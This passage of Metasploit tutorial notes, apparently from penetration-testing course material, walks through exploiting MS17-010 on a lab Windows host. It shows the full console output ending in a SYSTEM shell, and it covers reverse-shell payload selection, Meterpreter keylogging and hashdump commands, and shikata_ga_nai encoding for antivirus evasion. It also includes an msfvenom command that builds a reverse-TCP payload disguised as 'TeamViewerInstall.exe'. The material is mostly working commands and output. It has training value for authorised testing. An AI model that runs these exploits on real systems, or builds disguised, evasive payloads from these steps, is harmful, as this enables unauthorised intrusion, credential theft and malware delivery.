<h2 id="module-selection-and-usage"><a class="header" href="#module-selection-and-usage">Module Selection and Usage</a></h2>
<h3 id="step-1-finding-a-module"><a class="header" href="#step-1-finding-a-module">Step 1: Finding a Module</a></h3>
<p>First, identify your target and search for appropriate modules. For example, if you‚Äôve identified SMB port 445 open on a Windows target:</p>
<pre><code class="language-bash">msf6 &gt; search ms17_010
</code></pre>
<p>Output:</p>
<pre><code>Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
</code></pre>
<h3 id="step-2-selecting-a-module"><a class="header" href="#step-2-selecting-a-module">Step 2: Selecting a Module</a></h3>
<p>Use the module number or full path:</p>
<pre><code class="language-bash">msf6 &gt; use 1
# OR
msf6 &gt; use exploit/windows/smb/ms17_010_psexec
</code></pre>
<p>The prompt changes to indicate the active module:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt;
</code></pre>
<h3 id="step-3-viewing-module-options"><a class="header" href="#step-3-viewing-module-options">Step 3: Viewing Module Options</a></h3>
<p>Check what options need to be configured:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
</code></pre>
<p>Output shows:</p>
<ul>
<li><strong>Required</strong> options (must be set)</li>
<li><strong>Optional</strong> options (can be customized)</li>
<li>Current settings</li>
<li>Descriptions for each option</li>
</ul>
<h3 id="step-4-configuring-options"><a class="header" href="#step-4-configuring-options">Step 4: Configuring Options</a></h3>
<p>Set required options for your target:</p>
<pre><code class="language-bash"># Set target host
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40

# Set global options (persist across modules)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg LHOST 10.10.14.15

# Set local options (only for current module)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 4444
</code></pre>
<h3 id="step-5-checking-vulnerability-optional"><a class="header" href="#step-5-checking-vulnerability-optional">Step 5: Checking Vulnerability (Optional)</a></h3>
<p>If the module supports it, check if target is vulnerable before exploiting:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; check
</code></pre>
<h3 id="step-6-viewing-payloads"><a class="header" href="#step-6-viewing-payloads">Step 6: Viewing Payloads</a></h3>
<p>See available payloads for the selected exploit:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show payloads
</code></pre>
<h3 id="step-7-setting-payload-optional"><a class="header" href="#step-7-setting-payload-optional">Step 7: Setting Payload (Optional)</a></h3>
<p>If you want a specific payload instead of the default:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/reverse_tcp
</code></pre>
<p>Then configure payload-specific options:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
</code></pre>
<h3 id="step-8-executing-the-exploit"><a class="header" href="#step-8-executing-the-exploit">Step 8: Executing the Exploit</a></h3>
<p>Run the exploit:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
# OR
msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit
</code></pre>
<hr>
<h2 id="common-module-options"><a class="header" href="#common-module-options">Common Module Options</a></h2>
<h3 id="target-options-1"><a class="header" href="#target-options-1">Target Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>RHOSTS</code></td><td>Target host(s) - can be single IP, CIDR, or file</td><td><code>set RHOSTS 10.10.10.40</code></td></tr>
<tr><td><code>RHOST</code></td><td>Single target host</td><td><code>set RHOST 10.10.10.40</code></td></tr>
<tr><td><code>RPORT</code></td><td>Target port (TCP)</td><td><code>set RPORT 445</code></td></tr>
</tbody>
</table>
</div>
<h3 id="payload-options"><a class="header" href="#payload-options">Payload Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>LHOST</code></td><td>Attacker‚Äôs IP address (for reverse shells)</td><td><code>setg LHOST 10.10.14.15</code></td></tr>
<tr><td><code>LPORT</code></td><td>Attacker‚Äôs listening port</td><td><code>set LPORT 4444</code></td></tr>
<tr><td><code>PAYLOAD</code></td><td>Payload to use</td><td><code>set payload windows/meterpreter/reverse_tcp</code></td></tr>
<tr><td><code>TARGET</code></td><td>Target OS/architecture</td><td><code>set TARGET 0</code></td></tr>
</tbody>
</table>
</div>
<h3 id="other-common-options"><a class="header" href="#other-common-options">Other Common Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>SMBUser</code></td><td>Username for SMB authentication</td></tr>
<tr><td><code>SMBPass</code></td><td>Password for SMB authentication</td></tr>
<tr><td><code>SMBDomain</code></td><td>Windows domain for authentication</td></tr>
<tr><td><code>SHARE</code></td><td>SMB share name (e.g., ADMIN$, C$)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-commands-1"><a class="header" href="#useful-commands-1">Useful Commands</a></h2>
<h3 id="help-commands"><a class="header" href="#help-commands">Help Commands</a></h3>
<pre><code class="language-bash">help                    # General help menu
help search             # Search command help
help &lt;command&gt;          # Help for specific command
</code></pre>
<h3 id="information-commands"><a class="header" href="#information-commands">Information Commands</a></h3>
<pre><code class="language-bash">info &lt;module&gt;           # Detailed module information
show options            # Show module options
show payloads           # Show available payloads
show targets            # Show available targets
show advanced           # Show advanced options
</code></pre>
<h3 id="configuration-commands"><a class="header" href="#configuration-commands">Configuration Commands</a></h3>
<pre><code class="language-bash">set &lt;option&gt; &lt;value&gt;    # Set option for current module
setg &lt;option&gt; &lt;value&gt;   # Set global option (persists)
unset &lt;option&gt;          # Unset option
unsetg &lt;option&gt;         # Unset global option
</code></pre>
<h3 id="session-management"><a class="header" href="#session-management">Session Management</a></h3>
<pre><code class="language-bash">sessions                # List active sessions
sessions -i &lt;id&gt;        # Interact with session
sessions -k &lt;id&gt;        # Kill session
background              # Background current session
</code></pre>
<h3 id="module-commands"><a class="header" href="#module-commands">Module Commands</a></h3>
<pre><code class="language-bash">use &lt;module&gt;            # Select module
back                    # Go back to previous context
check                   # Check if target is vulnerable
run / exploit           # Execute exploit
</code></pre>
<hr>
<h2 id="exploit-rank-levels"><a class="header" href="#exploit-rank-levels">Exploit Rank Levels</a></h2>
<p>Metasploit ranks exploits based on reliability:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Rank</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>excellent</strong></td><td>Exploit will never crash the service</td></tr>
<tr><td><strong>great</strong></td><td>Exploit has a default target and auto-detects the target</td></tr>
<tr><td><strong>good</strong></td><td>Exploit has a default target</td></tr>
<tr><td><strong>normal</strong></td><td>Exploit is otherwise reliable</td></tr>
<tr><td><strong>average</strong></td><td>Exploit is generally unreliable</td></tr>
<tr><td><strong>low</strong></td><td>Exploit is nearly impossible to exploit</td></tr>
<tr><td><strong>manual</strong></td><td>Exploit is unstable or difficult to exploit</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="complete-example-workflow"><a class="header" href="#complete-example-workflow">Complete Example Workflow</a></h2>
<h3 id="scenario"><a class="header" href="#scenario">Scenario</a></h3>
<p>Target: Windows 7 machine with SMB port 445 open, potentially vulnerable to MS17-010</p>
<h3 id="step-by-step-execution"><a class="header" href="#step-by-step-execution">Step-by-Step Execution</a></h3>
<pre><code class="language-bash"># 1. Start msfconsole
msfconsole

# 2. Search for relevant exploit
msf6 &gt; search ms17_010

# 3. Select the exploit module
msf6 &gt; use exploit/windows/smb/ms17_010_psexec

# 4. View module options
msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options

# 5. Set target
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40

# 6. Set attacker IP (global, persists)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg LHOST 10.10.14.15

# 7. Set listening port
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 4444

# 8. Verify configuration
msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options

# 9. Check vulnerability (optional)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; check

# 10. Execute exploit
msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
</code></pre>
<h3 id="expected-output-successful-exploit"><a class="header" href="#expected-output-successful-exploit">Expected Output (Successful Exploit)</a></h3>
<pre><code>[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter&gt; shell

C:\Windows\system32&gt; whoami
nt authority\system
</code></pre>
<hr>
<h2 id="key-takeaways"><a class="header" href="#key-takeaways">Key Takeaways</a></h2>
<ol>
<li><strong>Module Structure</strong>: Understanding the <code>&lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</code> format helps identify appropriate modules</li>
<li><strong>Search Functionality</strong>: Powerful search with multiple keywords and filters helps find the right module quickly</li>
<li><strong>Required Options</strong>: Always check <code>show options</code> to identify required settings before exploitation</li>
<li><strong>Global vs Local</strong>: Use <code>setg</code> for options that should persist across modules (like <code>LHOST</code>), <code>set</code> for module-specific options</li>
<li><strong>Check First</strong>: Use <code>check</code> command when available to verify vulnerability before attempting exploitation</li>
<li><strong>Exploit Failures</strong>: A failed exploit doesn‚Äôt mean the vulnerability doesn‚Äôt exist - manual testing may be required</li>
<li><strong>Rank Matters</strong>: Higher ranked exploits (excellent, great) are more reliable than lower ranked ones</li>
</ol>
<hr>
<h2 id="best-practices-2"><a class="header" href="#best-practices-2">Best Practices</a></h2>
<ol>
<li><strong>Always verify targets</strong> before exploitation</li>
<li><strong>Use check command</strong> when available to avoid unnecessary exploitation attempts</li>
<li><strong>Set global options</strong> (<code>setg</code>) for values that won‚Äôt change (like <code>LHOST</code>)</li>
<li><strong>Review module info</strong> (<code>info &lt;module&gt;</code>) for detailed descriptions and references</li>
<li><strong>Test in lab environments</strong> before using in production assessments</li>
<li><strong>Document your process</strong> - note which modules worked and which didn‚Äôt</li>
<li><strong>Understand the exploit</strong> - don‚Äôt blindly run exploits without understanding what they do</li>
</ol>
<hr>
<h2 id="targets-2"><a class="header" href="#targets-2">Targets</a></h2>
<p>Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.</p>
<h3 id="viewing-targets"><a class="header" href="#viewing-targets">Viewing Targets</a></h3>
<p>The <code>show targets</code> command issued within an exploit module view displays all available vulnerable targets for that specific exploit. Issuing the same command in the root menu (outside of any selected exploit module) will indicate that you need to select an exploit module first.</p>
<pre><code class="language-bash">msf6 &gt; show targets

[-] No exploit module selected.
</code></pre>
<p>When viewing targets from within an exploit module:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to
   RHOSTS                10.10.10.40                              yes       The target host(s)
   RPORT                 445                                      yes       The Target port (TCP)
   ...

Exploit target:

   Id  Name
   --  ----
   0   Automatic
</code></pre>
<h3 id="using-the-info-command"><a class="header" href="#using-the-info-command">Using the Info Command</a></h3>
<p>The <code>info</code> command helps understand the exploit‚Äôs origins and functionality. It‚Äôs considered best practice to audit code for any artifact generation or additional features before use.</p>
<pre><code class="language-bash">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info

       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7
</code></pre>
<h3 id="selecting-a-target"><a class="header" href="#selecting-a-target">Selecting a Target</a></h3>
<p>If you know what versions are running on your target, use the <code>set target &lt;index no.&gt;</code> command:</p>
<pre><code class="language-bash">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6

target =&gt; 6
</code></pre>
<p>Leaving the selection to <code>Automatic</code> lets msfconsole perform service detection on the given target before launching a successful attack.</p>
<h3 id="target-types"><a class="header" href="#target-types">Target Types</a></h3>
<p>Targets can vary by:</p>
<ul>
<li>Service pack</li>
<li>OS version</li>
<li>Language version</li>
</ul>
<p>The return address can vary because a particular language pack changes addresses, a different software version is available, or the addresses are shifted due to hooks. Comments in the exploit module‚Äôs code can help determine what the target is defined by.</p>
<p><strong>To identify a target correctly:</strong></p>
<ol>
<li>Obtain a copy of the target binaries</li>
<li>Use <code>msfpescan</code> to locate a suitable return address</li>
</ol>
<hr>
<h2 id="payloads-detailed-1"><a class="header" href="#payloads-detailed-1">Payloads (Detailed)</a></h2>
<p>A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (exploit‚Äôs job) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (payload‚Äôs job).</p>
<h3 id="payload-types-1"><a class="header" href="#payload-types-1">Payload Types</a></h3>
<p>There are three different types of payload modules in the Metasploit Framework: <strong>Singles</strong>, <strong>Stagers</strong>, and <strong>Stages</strong>. Whether or not a payload is staged is represented by <code>/</code> in the payload name.</p>
<p>For example:</p>
<ul>
<li><code>windows/shell_bind_tcp</code> - Single payload with no stage</li>
<li><code>windows/shell/bind_tcp</code> - Stager (bind_tcp) + Stage (shell)</li>
</ul>
<h4 id="singles-1"><a class="header" href="#singles-1">Singles</a></h4>
<p>A Single payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large.</p>
<p>Singles are self-contained payloads - the sole object sent and executed on the target system, getting results immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.</p>
<h4 id="stagers-1"><a class="header" href="#stagers-1">Stagers</a></h4>
<p>Stager payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host.</p>
<p>Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.</p>
<p><strong>Windows NX vs. NO-NX Stagers:</strong></p>
<ul>
<li>Reliability issue for NX CPUs and DEP</li>
<li>NX stagers are bigger (VirtualAlloc memory)</li>
<li>Default is now NX + Win7 compatible</li>
</ul>
<h4 id="stages-1"><a class="header" href="#stages-1">Stages</a></h4>
<p>Stages are payload components that are downloaded by stager‚Äôs modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others.</p>
<p>Payload stages automatically use middle stagers:</p>
<ul>
<li>A single recv() fails with large payloads</li>
<li>The Stager receives the middle stager</li>
<li>The middle Stager then performs a full download</li>
<li>Also better for RWX</li>
</ul>
<h3 id="staged-payloads"><a class="header" href="#staged-payloads">Staged Payloads</a></h3>
<p>A staged payload is an exploitation process that is modularized and functionally separated to help segregate the different functions into different code blocks, each completing its objective individually but working on chaining the attack together.</p>
<p>The scope of this payload, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with Antivirus (AV) / Intrusion Prevention System (IPS) evasion.</p>
<p><strong>Stage0</strong> represents the initial shellcode sent over the network to the target machine‚Äôs vulnerable service, with the sole purpose of initializing a connection back to the attacker machine (reverse connection). Common names include:</p>
<ul>
<li><code>reverse_tcp</code></li>
<li><code>reverse_https</code></li>
<li><code>bind_tcp</code></li>
</ul>
<h3 id="listing-payloads"><a class="header" href="#listing-payloads">Listing Payloads</a></h3>
<pre><code class="language-bash">msf6 &gt; show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
   -    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   ...
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection)
</code></pre>
<h3 id="filtering-payloads-with-grep"><a class="header" href="#filtering-payloads-with-grep">Filtering Payloads with grep</a></h3>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64)
   ...

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter show payloads

[*] 14

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter, Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter, Reverse TCP Stager (RC4 Encryption)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter, Reverse TCP Stager with UUID Support
</code></pre>
<h3 id="selecting-payloads"><a class="header" href="#selecting-payloads">Selecting Payloads</a></h3>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15
# or
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
</code></pre>
<h3 id="common-windows-payloads-1"><a class="header" href="#common-windows-payloads-1">Common Windows Payloads</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Payload</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>generic/custom</code></td><td>Generic listener, multi-use</td></tr>
<tr><td><code>generic/shell_bind_tcp</code></td><td>Generic listener, multi-use, normal shell, TCP connection binding</td></tr>
<tr><td><code>generic/shell_reverse_tcp</code></td><td>Generic listener, multi-use, normal shell, reverse TCP connection</td></tr>
<tr><td><code>windows/x64/exec</code></td><td>Executes an arbitrary command (Windows x64)</td></tr>
<tr><td><code>windows/x64/loadlibrary</code></td><td>Loads an arbitrary x64 library path</td></tr>
<tr><td><code>windows/x64/messagebox</code></td><td>Spawns a dialog via MessageBox</td></tr>
<tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal shell, single payload, reverse TCP connection</td></tr>
<tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>Normal shell, stager + stage, reverse TCP connection</td></tr>
<tr><td><code>windows/x64/shell/bind_ipv6_tcp</code></td><td>Normal shell, stager + stage, IPv6 Bind TCP stager</td></tr>
<tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + varieties</td></tr>
<tr><td><code>windows/x64/powershell/$</code></td><td>Interactive PowerShell sessions + varieties</td></tr>
<tr><td><code>windows/x64/vncinject/$</code></td><td>VNC Server (Reflective Injection) + varieties</td></tr>
</tbody>
</table>
</div>
<h3 id="configuring-payload-options"><a class="header" href="#configuring-payload-options">Configuring Payload Options</a></h3>
<p>After selecting a payload, configure the required options:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Parameter</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>LHOST</code></td><td>The host‚Äôs IP address (attacker‚Äôs machine)</td></tr>
<tr><td><code>LPORT</code></td><td>Listening port (verify not already in use)</td></tr>
</tbody>
</table>
</div>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; ifconfig

[*] exec: ifconfig

tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500
      inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.15
LHOST =&gt; 10.10.14.15

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40
RHOSTS =&gt; 10.10.10.40
</code></pre>
<h3 id="meterpreter-payload"><a class="header" href="#meterpreter-payload">Meterpreter Payload</a></h3>
<p>Meterpreter payloads offer significant flexibility with vast base functionality. Combined with plugins such as GentilKiwi‚Äôs Mimikatz Plugin, they can automate and quickly deliver parts of the pentest.</p>
<p><strong>Note:</strong> The <code>whoami</code> Windows command doesn‚Äôt work in Meterpreter - use <code>getuid</code> instead.</p>
<h4 id="meterpreter-commands-1"><a class="header" href="#meterpreter-commands-1">Meterpreter Commands</a></h4>
<pre><code class="language-bash">meterpreter &gt; help

Core Commands
=============
    background                Backgrounds the current session
    channel                   Displays information or control active channels
    close                     Closes a channel

Stdapi: System Commands
=======================
    getuid        Gets the user that the server is running as
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system

Stdapi: User interface Commands
===============================
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    screenshot     Grab a screenshot of the interactive desktop

Priv: Password database Commands
================================
    hashdump      Dumps the contents of the SAM database
</code></pre>
<h4 id="navigating-with-meterpreter"><a class="header" href="#navigating-with-meterpreter">Navigating with Meterpreter</a></h4>
<pre><code class="language-bash">meterpreter &gt; cd Users
meterpreter &gt; ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris
...

meterpreter &gt; shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users&gt; whoami
nt authority\system
</code></pre>
<p>The channel represents the connection between your device and the target host, established via reverse TCP connection using a Meterpreter Stager and Stage.</p>
<hr>
<h2 id="encoders-1-1"><a class="header" href="#encoders-1-1">Encoders</a></h2>
<p>Over 15 years, Encoders have assisted with making payloads compatible with different processor architectures while helping with antivirus evasion.</p>
<h3 id="supported-architectures-1"><a class="header" href="#supported-architectures-1">Supported Architectures</a></h3>
<ul>
<li>x64</li>
<li>x86</li>
<li>sparc</li>
<li>ppc</li>
<li>mips</li>
</ul>
<h3 id="purpose-of-encoders"><a class="header" href="#purpose-of-encoders">Purpose of Encoders</a></h3>
<ol>
<li><strong>Architecture Compatibility</strong>: Change payload to run on different operating systems and architectures</li>
<li><strong>Bad Character Removal</strong>: Remove hexadecimal opcodes known as bad characters from the payload</li>
<li><strong>AV Evasion</strong>: Encoding in different formats can help with detection evasion (though modern AV has caught up)</li>
</ol>
<h3 id="shikata-ga-nai-sgn"><a class="header" href="#shikata-ga-nai-sgn">Shikata Ga Nai (SGN)</a></h3>
<p>Shikata Ga Nai (‰ªïÊñπ„Åå„Å™„ÅÑ - ‚ÄúIt cannot be helped‚Äù) was one of the most utilized encoding schemes because it was very hard to detect payloads encoded through its mechanism. However, modern detection methods have caught up, and these encoded payloads are far from being universally undetectable anymore.</p>
<h3 id="listing-encoders"><a class="header" href="#listing-encoders">Listing Encoders</a></h3>
<pre><code class="language-bash">msf6 &gt; show encoders

Encoders
========

   #   Name                          Disclosure Date  Rank       Check  Description
   -   ----                          ---------------  ----       -----  -----------
   0   cmd/brace                                      low        No     Bash Brace Expansion Command Encoder
   1   cmd/echo                                       good       No     Echo Command Encoder
   ...
   26  x86/shikata_ga_nai            2019-01-07       excellent  No     Polymorphic XOR Additive Feedback Encoder
   27  x64/xor                                        manual     No     XOR Encoder
   28  x64/zutto_dekiru                               manual     No     Zutto Dekiru
</code></pre>
<h3 id="generating-encoded-payloads-with-msfvenom"><a class="header" href="#generating-encoded-payloads-with-msfvenom">Generating Encoded Payloads with msfvenom</a></h3>
<h4 id="basic-encoded-payload"><a class="header" href="#basic-encoded-payload">Basic Encoded Payload</a></h4>
<pre><code class="language-bash">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
</code></pre>
<h4 id="multiple-encoding-iterations"><a class="header" href="#multiple-encoding-iterations">Multiple Encoding Iterations</a></h4>
<pre><code class="language-bash">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
...
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
</code></pre>
<p><strong>Note:</strong> Even with 10 iterations, modern AV products still often detect these payloads. Additional evasion methodologies are required for reliable evasion.</p>
<h3 id="virustotal-analysis-1"><a class="header" href="#virustotal-analysis-1">VirusTotal Analysis</a></h3>
<p>Metasploit offers <code>msf-virustotal</code> tool to analyze payloads (requires free VirusTotal registration):</p>
<pre><code class="language-bash">msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe

[*] Using API key: &lt;API key&gt;
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;
</code></pre>
<hr>
<h2 id="databases-2"><a class="header" href="#databases-2">Databases</a></h2>
<p>Databases in msfconsole are used to keep track of your results. During complex assessments, things can get complicated due to the sheer amount of search results, entry points, detected issues, and discovered credentials.</p>
<p>Msfconsole has built-in support for the PostgreSQL database system. This provides:</p>
<ul>
<li>Direct, quick, and easy access to scan results</li>
<li>Ability to import and export results with third-party tools</li>
<li>Configure Exploit module parameters with existing findings</li>
</ul>
<h3 id="setting-up-the-database"><a class="header" href="#setting-up-the-database">Setting up the Database</a></h3>
<h4 id="check-postgresql-status"><a class="header" href="#check-postgresql-status">Check PostgreSQL Status</a></h4>
<pre><code class="language-bash">sudo service postgresql status

‚óè postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
